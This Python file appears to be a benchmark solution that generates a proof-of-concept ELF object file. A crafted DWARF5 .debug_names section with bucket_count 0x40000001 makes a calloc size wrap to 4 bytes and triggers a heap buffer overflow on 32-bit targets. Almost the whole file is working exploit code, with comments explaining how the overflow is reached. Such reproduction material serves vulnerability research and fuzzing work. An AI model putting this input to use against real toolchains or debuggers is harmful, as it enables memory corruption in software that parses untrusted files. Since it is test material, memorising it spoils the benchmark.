import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC ELF file that triggers the vulnerability.
        """
        # Helper functions to pack data in little-endian format.
        def p8(x: int) -> bytes: return struct.pack('<B', x)
        def p16(x: int) -> bytes: return struct.pack('<H', x)
        def p32(x: int) -> bytes: return struct.pack('<I', x)
        def p64(x: int) -> bytes: return struct.pack('<Q', x)

        # The vulnerability is a heap buffer overflow on 32-bit targets caused
        # by an integer overflow in calloc's size calculation.
        # size = bucket_count * sizeof(Dwarf_Word).
        # On a 32-bit system, sizeof(Dwarf_Word) is 4 bytes.
        # We set bucket_count to 0x40000001.
        # 0x40000001 * 4 = 0x100000004, which wraps to 4 for a 32-bit size_t.
        # calloc allocates a 4-byte buffer. The second write overflows.
        bucket_count = 0x40000001

        # The DWARF5 .debug_names header has a size of 26 bytes after the
        # initial unit_length field.
        header_size_after_len = 26

        # To trigger the overflow, the read from the input file must succeed
        # for at least two iterations. Each read is 4 bytes for a hash.
        # unit_length = header_size + data_size
        unit_length = header_size_after_len + 8

        debug_names_content = b''
        debug_names_content += p32(unit_length)       # unit_length
        debug_names_content += p16(5)                 # version (must be 5)
        debug_names_content += p8(4)                  # offset_size
        debug_names_content += p8(0)                  # extension_size
        debug_names_content += p16(0)                 # padding
        debug_names_content += p32(0)                 # cu_count
        debug_names_content += p32(0)                 # local_tu_count
        debug_names_content += p32(0)                 # foreign_tu_count
        debug_names_content += p32(bucket_count)      # bucket_count (the trigger value)
        debug_names_content += p32(0)                 # name_count
        # Data for the first two hash reads to succeed.
        debug_names_content += p32(0) * 2

        # Construct a minimal 64-bit ELF relocatable object file (.o)
        shstrtab_content = b'\x00.debug_names\x00.shstrtab\x00'

        ELF_HEADER_SIZE = 64
        SECTION_HEADER_SIZE = 64
        NUM_SECTIONS = 3 # NULL, .debug_names, .shstrtab

        DEBUG_NAMES_OFFSET = ELF_HEADER_SIZE
        DEBUG_NAMES_SIZE = len(debug_names_content)

        SHSTRTAB_OFFSET = DEBUG_NAMES_OFFSET + DEBUG_NAMES_SIZE
        SHSTRTAB_SIZE = len(shstrtab_content)

        SHT_OFFSET = SHSTRTAB_OFFSET + SHSTRTAB_SIZE

        # ELF Header
        elf_header = b'\x7fELF\x02\x01\x01' + b'\x00' * 9
        elf_header += p16(1)                              # e_type = ET_REL
        elf_header += p16(62)                             # e_machine = EM_X86_64
        elf_header += p32(1)                              # e_version
        elf_header += p64(0)                              # e_entry
        elf_header += p64(0)                              # e_phoff
        elf_header += p64(SHT_OFFSET)                     # e_shoff
        elf_header += p32(0)                              # e_flags
        elf_header += p16(ELF_HEADER_SIZE)                # e_ehsize
        elf_header += p16(0) * 2                          # e_phentsize, e_phnum
        elf_header += p16(SECTION_HEADER_SIZE)            # e_shentsize
        elf_header += p16(NUM_SECTIONS)                   # e_shnum
        elf_header += p16(NUM_SECTIONS - 1)               # e_shstrndx

        # Section Header Table
        sht = b''
        # NULL Section Header
        sht += b'\x00' * SECTION_HEADER_SIZE

        # .debug_names Section Header
        sht += p32(shstrtab_content.find(b'.debug_names')) # sh_name
        sht += p32(1)                                      # sh_type = SHT_PROGBITS
        sht += p64(0)                                      # sh_flags
        sht += p64(0)                                      # sh_addr
        sht += p64(DEBUG_NAMES_OFFSET)                     # sh_offset
        sht += p64(DEBUG_NAMES_SIZE)                       # sh_size
        sht += p32(0) * 2                                  # sh_link, sh_info
        sht += p64(1)                                      # sh_addralign
        sht += p64(0)                                      # sh_entsize

        # .shstrtab Section Header
        sht += p32(shstrtab_content.find(b'.shstrtab'))    # sh_name
        sht += p32(3)                                      # sh_type = SHT_STRTAB
        sht += p64(0)                                      # sh_flags
        sht += p64(0)                                      # sh_addr
        sht += p64(SHSTRTAB_OFFSET)                        # sh_offset
        sht += p64(SHSTRTAB_SIZE)                          # sh_size
        sht += p32(0) * 2                                  # sh_link, sh_info
        sht += p64(1)                                      # sh_addralign
        sht += p64(0)                                      # sh_entsize

        return elf_header + debug_names_content + shstrtab_content + sht
